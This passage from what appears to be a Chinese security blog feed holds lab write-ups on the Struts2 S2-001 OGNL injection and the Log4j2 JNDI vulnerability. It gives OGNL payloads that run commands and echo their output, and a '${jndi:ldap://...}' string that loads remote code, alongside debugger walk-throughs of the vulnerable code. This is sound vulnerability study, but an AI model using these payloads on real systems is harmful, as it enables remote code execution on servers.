class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-<span class="number">001</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-<span class="number">001</span> Demo&lt;/h2&gt;</span><br><span class="line">&lt;s:form action=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;username&quot;</span> label=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;password&quot;</span> label=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>welcome.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-<span class="number">001</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value=<span class="string">&quot;username&quot;</span>&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后在 <code>main</code> 文件夹下创建一个 <code>resources</code> 文件夹，内部添加一个 <code>struts.xml</code>，内容为</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-001&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.test.s2001.action.LoginAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>至此struts2环境搭建完成</p><p>struts2环境的目录结构</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" class><p>struts2的执行流程：</p><p>简单说一下struts2接收数据后的后端处理流程，当用户在前端输入数据请求特定的URL后（例如<a href="http://example.com/myapp/myaction.action%EF%BC%89%E8%AF%B7%E6%B1%82%E5%8F%91%E9%80%81%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E8%BF%9B%E5%85%A5%E5%88%B0Struts">http://example.com/myapp/myaction.action）请求发送到服务器，进入到Struts</a> 2的过滤器，也就是上面在web.xml中配置的过滤器，它接收到所有请求，并作为入口点开始 Struts 2 的执行流程。该过滤器分析请求的 URL，并根据配置文件中的映射规则找到相应的 Action 类，然后调用该 Action 类的 <code>execute()</code> 方法。（在这里也就是LoginAction类的execute方法）进行业务数据处理，<code>execute()</code> 方法返回一个结果字符串，表示请求的处理结果。这个结果字符串与配置文件中的结果映射相匹配，决定如何处理请求的后续步骤。（也就是struts.xml编写的内容）根据结果字符串的映射，Struts 2 将找到相应的结果视图，然后呈现给用户。</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" class><p>环境搭建成功</p><h2 id="0x03-OGNL表达式"><a href="#0x03-OGNL表达式" class="headerlink" title="0x03 OGNL表达式"></a>0x03 OGNL表达式</h2><p>官方解释：OGNL（Object-Graph Navigation Language）是一种用于访问和操作对象图结构的表达式语言。它主要用于在 Java 程序中对对象图进行导航、访问属性和调用方法等操作，使得开发人员能够更轻松地处理复杂的对象结构。</p><p>OGNL 表达式在诸如 Struts 2、Spring 等框架中广泛使用，它可以调用方法，那么就有可能会执行恶意命令。</p><p>OGNL表达式具体原理细节不再叙述，网上文章很多，Struts 2框架能够RCE，主要就是OGNL表达式注入。在 OGNL表达式中，<code>%&#123;&#125;</code> 是用于执行内联的动态操作的语法。这个语法允许你在表达式中执行一些特定的操作，比如调用方法、执行代码块等。</p><p>在 Struts 2 框架中，<code>%&#123;&#125;</code> 是一种用于包装动态内容的语法，用于在视图中嵌入动态的数据或操作。具体用法可以包括从值栈中获取属性值、调用方法、执行代码块等。</p><p>例如表单输入%{1+1}就会返回2，1+1表达式被执行了。</p><p>ognl表达式注入相关文章：</p><p><a href="https://xz.aliyun.com/t/10482">https://xz.aliyun.com/t/10482</a></p><h2 id="0x04-S2-001漏洞利用与分析"><a href="#0x04-S2-001漏洞利用与分析" class="headerlink" title="0x04 S2-001漏洞利用与分析"></a>0x04 S2-001漏洞利用与分析</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>影响范围：Struts2 版本 2.0.0 到 2.0.8.1</p><p>弹计算器的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" class><p>存在RCE漏洞，还有将页面回显到前端的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>通过数据流将执行结果返回给用户</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" class><p>能够RCE的根本原因就是Struts 2 框架对用户的输入用ognl表达式来解析。</p><h3 id="漏洞流程分析"><a href="#漏洞流程分析" class="headerlink" title="漏洞流程分析"></a>漏洞流程分析</h3><p>首先搞清楚断点应该下在哪，前面分析Struts 2 框架框架流程那一块说过，过滤器接收数据是业务流程的入口，所以我们锁定FilterDispatcher类，断点下在doFilter方法上，doFilter方法做了以下业务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">设置编码和本地化信息</span><br><span class="line">创建 ActionContext 对象</span><br><span class="line">分配当前线程的分发器</span><br><span class="line">将request对象进行封装</span><br><span class="line">获取 ActionMapping 对象, ActionMapping 对象对应一个action详细配置信息</span><br><span class="line">执行 Action 请求, 也就是第 172 行的 serviceAction() 方法</span><br></pre></td></tr></table></figure><p>前端表单用户名密码都输入%{1+1}  开始调试</p><p>前面都是一些基础的赋值与判断，重点在serviceAction方法里，跟进</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" class><p>首先判断有没有ValueStack对象，如果没有的话，获取当前线程的ActionContext对象，通过 ActionProxyFactory 的 <code>createActionProxy()</code> 类创建一个Action代理，然后调用execute()方法，</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" class><p>这里跟进invoke方法</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" class><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" class><p>在这个方法里面，它会顺序的递归执行当前 Action 中所配置的所有的拦截器，在struts2 包内的 struts-default.xml 里面也可以看到有众多迭代器</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" class><p>而ParametersInterceptor这个迭代器是真正处理我们用户输入的数据的，可能在这个迭代器中就会存在ognl表达式的处理，迭代的地方就不调了，遍历到ParametersInterceptor迭代器的时候，会跟进到它的doIntercept方法，将断点打在这个方法里。</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" class><p>首先获取当前正在执行的 Action 实例，然后检查该 Action 是否需要处理参数。如果需要，它从 Action 上下文中获取请求的参数，并在调试日志中记录参数信息，然后设置一些OGNL 上下文的相关配置，我们跟进到setParameters方法里面，</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" class><p>然后跟进到setValue方法，直到进入到SimpleNode类的setValue方法。当迭代器处理数据完成后，跟进这个方法</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" class><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" class><p>通过反射调用action类的execute方法处理业务请求，继续往下走，跟进到 executeResult() 方法里，再跟进 execute 然后继续跟进 doExecute </p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" class><p>这个方法里准备基础的页面配置，可以看到返回的页面是jsp。发送真正的响应信息，之后调用<code>JspServlet</code>来处理请求，在解析标签的时候，解析标签的结束符会调用 ComponentTagSupport 类的 doEndTag() 方法，我们跟进到这个方法</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/16.png" class><p>继续跟进end方法，跟进evaluateParams方法</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/17.png" class><p>由于 <code>altSyntax</code> 默认开启了，通过findValue方法寻找参数值，然后跟进到最终的漏洞触发点 translateVariables 方法</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/18.png" class><p>首先把username的值取出来，然后再一次循环把它赋值给expression，</p><img src="/2023/08/13/Struts2-S2-001%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/19.png" class><p>通过这个findValue方法，将1+1解析为2，然后又将2赋值给expression，最后发现不是ognl表达式就会return返回。到此流程结束。</p><h2 id="0x05-漏洞分析总结"><a href="#0x05-漏洞分析总结" class="headerlink" title="0x05 漏洞分析总结"></a>0x05 漏洞分析总结</h2><p>实际上，S2-001漏洞在解析jsp文件的数据标签的时候，如果开启了 altSyntax （而且它是默认开启）且为字符串类型， struts2 会对标签在值栈中自栈顶向栈底找与表单 name 名同名的属性值进行 ognl 表达式解析并显示，所以在表单输入%{}格式的ognl表达式的时候，它会截取%{}里面的表达式并且解析执行，用户不信任的输入，造成命令执行。</p><p>参考文章：</p><p><a href="https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#0x04-%E6%80%BB%E7%BB%93">https://drun1baby.top/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/#0x04-%E6%80%BB%E7%BB%93</a></p><p><a href="https://zhuanlan.zhihu.com/p/615500587">https://zhuanlan.zhihu.com/p/615500587</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2 JNDI注入漏洞(CVE-2021-44228)</title>
      <link href="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/"/>
      <url>/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近看一下Log4j2的这个比较出名的漏洞，相较于今天已经过去很久了。这个漏洞是21年十一二月份爆出来的洞，影响巨大，当时刚上大一，但是也有所耳闻。（一行代码让十几万程序员加班三天）近些年面试的时候也比较爱问这个，所以今天来分析一下一行代码是怎么能够命令执行的。</p></blockquote><h2 id="0x01-Log4j2简介"><a href="#0x01-Log4j2简介" class="headerlink" title="0x01 Log4j2简介"></a>0x01 Log4j2简介</h2><p>log4j是Apache的一个开源项目，它一个用于记录日志信息的Java库，它提供了强大的日志记录功能，被广泛用于Java应用程序的日志管理。log4j2是log4j的升级版，旨在提供更强大、更灵活、更高效的日志记录功能。在java开发主流的框架中，比如springboot，大部分都是将log4j2作为日志管理工具。</p><h3 id="Log4j2的基本开发使用"><a href="#Log4j2的基本开发使用" class="headerlink" title="Log4j2的基本开发使用"></a>Log4j2的基本开发使用</h3><p>不仅要知道log4j2是什么东西，也要知道它是怎么用的。</p><p>导入log4j2的相关依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>这里用的是2.14.2版本，也就是有漏洞的版本。log4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。</p><p>这里，我们简单用 xml 的方式来实现，文件如下</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">status</span>=<span class="string">&quot;info&quot;</span>&gt;</span>    </span><br><span class="line"> <span class="tag">&lt;<span class="name">Properties</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern1&quot;</span>&gt;</span>[%-5p] %d %c - %m%n<span class="tag">&lt;/<span class="name">Property</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;pattern2&quot;</span>&gt;</span>  </span><br><span class="line"> =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">Property</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">Property</span> <span class="attr">name</span>=<span class="string">&quot;filePath&quot;</span>&gt;</span>logs/myLog.log<span class="tag">&lt;/<span class="name">Property</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">Properties</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">appenders</span>&gt;</span> <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;$&#123;pattern1&#125;&quot;</span>/&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">Console</span>&gt;</span> <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;RollingFile&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;$&#123;filePath&#125;&quot;</span>  </span></span><br><span class="line"><span class="tag"> <span class="attr">filePattern</span>=<span class="string">&quot;logs/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log.gz&quot;</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;$&#123;pattern2&#125;&quot;</span>/&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;5 MB&quot;</span>/&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">appenders</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">loggers</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;RollingFile&quot;</span>/&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">root</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义日志打印的基本格式，然后写一个小demo测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j2.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2Test01.class);</span><br><span class="line">        logger.info(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        logger.warn(<span class="string">&quot;warn!&quot;</span>);<span class="comment">//打印三条不同级别的消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑一下看看运行结果</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/1.png" class><p>成功打印出什么级别的日志，时间，消息等等。</p><h3 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><p>在实际业务中，有些日志是需要输出的，比如会输出到logs的日志文件中。</p><p>举个例子，前台用户登录是否成功的消息日志会被记录到我们的日志文件中，下面写个小代码模仿应用场景</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j2.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2Test02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2Test02.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (username == <span class="literal">null</span>)&#123;</span><br><span class="line">            logger.error(<span class="string">&quot;username不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;&#123;&#125; Login in!&quot;</span>,username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上代码肯定不是这样子，它会结合Mybatis查询数据库，将是否查询成功作为一个判断，再打印日志。我们只需要简单知道一下应用场景就行。</p><p>运行看看结果</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/2.png" class><h2 id="0x02-Log4j2漏洞原理分析"><a href="#0x02-Log4j2漏洞原理分析" class="headerlink" title="0x02 Log4j2漏洞原理分析"></a>0x02 Log4j2漏洞原理分析</h2><h3 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h3><p>2.x &lt;&#x3D; log4j &lt;&#x3D; 2.15.0-rc1</p><h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2.漏洞原理"></a>2.漏洞原理</h3><p>看这段代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;&#123;&#125; Login in!&quot;</span>,username);</span><br></pre></td></tr></table></figure><p>username用户可控，这本来就是不安全的，用户不信任的输入可能会导致一些安全问题，</p><p>让username&#x3D;${java:os}，日志输出的就不是${java:os}</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/3.png" class><p>而是操作系统的相关信息。查阅官方文档就可以知道这是log4j支持这样的一种功能</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/4.png" class><p>像这样的还有这几个，其实这些并没有多么大的危害，最多也就泄露一些敏感信息。</p><p>其实继续查阅文档，还有JNDI的lookup这一栏</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/5.png" class><p>看到这里大概也会猜到这里存在JNDI注入（官方文档链接：<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup%EF%BC%89">https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup）</a></p><p>写个漏洞exp试试吧，这是JNDI的lookup，那么照葫芦画瓢，格式应该写成${jndi:exp}</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j2.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j2EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4j2EXP.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:8085/zRFaCCEj&#125;&quot;</span>;</span><br><span class="line">        logger.info(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置好反连</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/6.png" class><p>run一下看看</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/7.png" class><p>弹了两次计算器，其实这弹的两次计算器的触发流程都是一样的，分析一个就行。</p><h3 id="3-调试与分析"><a href="#3-调试与分析" class="headerlink" title="3.调试与分析"></a>3.调试与分析</h3><p>调试有点难度，前面不太重要的信息太多，什么封装，函数调用啥的，所以别一开始就调试，设置到合适的断点</p><p>断点就下在PatternLayout类的toSerializable方法</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/8.png" class><p>这个event就是封装了日志消息的类，然后遍历日志信息，这个format方法可以看作处理字符串的方法，当i遍历到7的时候</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/9.png" class><p>buffer是缓冲区，把打印的日志放进去，刚好遍历到我们输入的恶意代码的地方，然后跟进format函数</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/10.png" class><p>然后继续跟进这个方法</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/11.png" class><p>开头这一部分用于处理日志事件的消息内容，并将其格式化输出到 StringBuilder对象中。它根据消息内容的类型来选择合适的格式化方法，并将格式化后的文本输出到 workingBuilder 对象中，以供后续处理和输出。</p><p>然后走到下面这个if语句里，判断是否是 Log4j2 的 lookups 功能，满足条件，继续往下走</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/12.png" class><p>workingBuilder里存储着日志信息，时间，级别，以及我们的payload等等</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/13.png" class><p>offset为56，从56位开始循环遍历，检查当前遍历的这两位是否是${，第56位workingBuilder对应的就是我们输入的payload的前两位，满足条件。从第三位开始截取日志消息，赋值给value，从图上可以看到，payload最后一个}还没有去掉。跟进到replace方法</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/14.png" class><p>然后调用substitute方法，跟进</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/15.png" class><p>前面都是一些变量的初始化，没什么用。来到这个while循环，bufEnd是38，也就是payload的长度</p><p>prefixMatcher里有两个字符：$和{ 这行代码是在字符数组 chars中从指定位置 pos 开始，使用 prefixMatcher 对象进行前缀匹配。如果在指定的位置存在匹配的前缀，那么 startMatchLen 将记录匹配的长度，否则为 0。</p><p>startMatchLen长度不为0，它会走到</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &gt; offset &amp;&amp; chars[pos - <span class="number">1</span>] == escape)</span><br></pre></td></tr></table></figure><p>这个if条件里，很明显不满足，因为pos是0</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/16.png" class><p>进入到这个else，此时pos为2，再判断从2开始字符是不是${ 很明显不是</p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/17.png" class><p>走到这里，又有一个匹配，匹配 } 匹配不到，pos+1开启下一轮循环，一直循环到最后一个字符，也就是 } </p><img src="/2023/08/01/Log4j2-JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-44228/18.png" class><p>匹配到了，endMatchLen不为空，它会去掉 ${} 占位符，留下真正的恶意代码，此时的bufname就是jndi:ldap:&#x2F;&#x2F;127.0.0.1:8085&#x2F;zRFaCCEj 